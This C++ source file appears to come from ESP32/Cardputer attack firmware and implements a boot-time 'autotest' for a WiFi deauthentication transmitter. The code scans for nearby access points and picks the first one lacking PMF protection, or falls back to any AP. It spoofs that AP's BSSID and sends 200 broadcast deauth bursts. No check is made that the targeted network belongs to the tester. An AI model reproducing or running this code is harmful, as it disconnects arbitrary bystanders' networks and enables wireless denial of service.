/*
 * deauth_autotest.cpp — boot-time self-test for the deauth TX path.
 *
 * Gated on -DPOSEIDON_AUTO_DEAUTH_TEST at build time. When enabled,
 * replaces ui_splash's wait-for-keypress with an automated loop that:
 *   1. Scans WiFi
 *   2. Picks the first non-PMF AP it finds
 *   3. Runs wifi_silent_ap_begin + deauth bursts for ~15s
 *   4. Logs every rc code + error string from the blob to serial
 *
 * Purpose: iterate the deauth TX path without needing a human to
 * press keys on the Cardputer. Remove (or flip the flag off) once
 * the rc=0 state is reached.
 */
#include "app.h"
#include "radio.h"
#include "features/wifi_deauth_frame.h"
#include <WiFi.h>
#include <esp_wifi.h>

#ifdef POSEIDON_AUTO_DEAUTH_TEST

void deauth_autotest_run(void)
{
    Serial.println("\n========== DEAUTH AUTOTEST ==========");
    delay(500);

    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, false);
    delay(100);

    Serial.println("[autotest] scanning WiFi...");
    int n = WiFi.scanNetworks(false, false, false, 150);
    Serial.printf("[autotest] scan returned %d APs\n", n);
    if (n <= 0) {
        Serial.println("[autotest] no APs — ABORT");
        return;
    }

    /* Pick first non-PMF AP. PMF (WPA3-PSK=6, WPA2-Enterprise=5, etc)
     * cryptographically drops plain deauth so testing against those
     * gives misleading results. Prefer auth mode 3 (WPA2-PSK). */
    uint8_t target_bssid[6] = {0};
    uint8_t target_ch = 1;
    int picked = -1;
    for (int i = 0; i < n && i < 10; ++i) {
        uint8_t *b = WiFi.BSSID(i);
        int ch = WiFi.channel(i);
        int rssi = WiFi.RSSI(i);
        int auth = (int)WiFi.encryptionType(i);
        Serial.printf("[autotest]  [%d] %s  bssid=%02X:%02X:%02X:%02X:%02X:%02X  ch=%d  rssi=%d  auth=%d\n",
                      i, WiFi.SSID(i).c_str(),
                      b[0], b[1], b[2], b[3], b[4], b[5],
                      ch, rssi, auth);
        /* Prefer non-PMF. auth=3=WPA2-PSK, 2=WPA-PSK, 8=WPA2-WPA-PSK. */
        bool is_pmf = (auth == 5 || auth == 6 || auth == 7 || auth >= 10);
        if (picked < 0 && !is_pmf) {
            memcpy(target_bssid, b, 6);
            target_ch = ch;
            picked = i;
        }
    }
    if (picked < 0) {
        /* No non-PMF AP — grab the first one to at least test the TX path. */
        uint8_t *first = WiFi.BSSID((uint8_t)0);
        if (first) memcpy(target_bssid, first, 6);
        target_ch = WiFi.channel((uint8_t)0);
        picked = 0;
        Serial.println("[autotest] WARN: all APs are PMF-protected, using first anyway");
    }
    WiFi.scanDelete();
    Serial.printf("[autotest] target BSSID=%02X:%02X:%02X:%02X:%02X:%02X ch=%u\n",
                  target_bssid[0], target_bssid[1], target_bssid[2],
                  target_bssid[3], target_bssid[4], target_bssid[5], target_ch);

    Serial.println("[autotest] wifi_silent_ap_begin...");
    wifi_silent_ap_set_source_mac(target_bssid);
    esp_err_t ap_rc = wifi_silent_ap_begin(target_ch);
    Serial.printf("[autotest] silent_ap rc=%d\n", (int)ap_rc);

    Serial.println("[autotest] transmitting 200 deauth bursts...");
    uint16_t seq = (uint16_t)(esp_random() & 0x0FFF);
    uint32_t ok_total = 0;
    uint32_t fail_total = 0;
    for (int i = 0; i < 200; ++i) {
        int ok = wifi_deauth_broadcast(target_bssid, &seq);
        ok_total += ok;
        fail_total += (4 - ok);
        delay(10);
    }
    Serial.printf("[autotest] DONE: ok=%lu fail=%lu rate=%lu%%\n",
                  (unsigned long)ok_total, (unsigned long)fail_total,
                  (unsigned long)(ok_total * 100 / (ok_total + fail_total + 1)));

    Serial.println("[autotest] wifi_silent_ap_end...");
    wifi_silent_ap_end();
    Serial.println("========== DEAUTH AUTOTEST END ==========\n");
}

#else

void deauth_autotest_run(void) {}

#endif
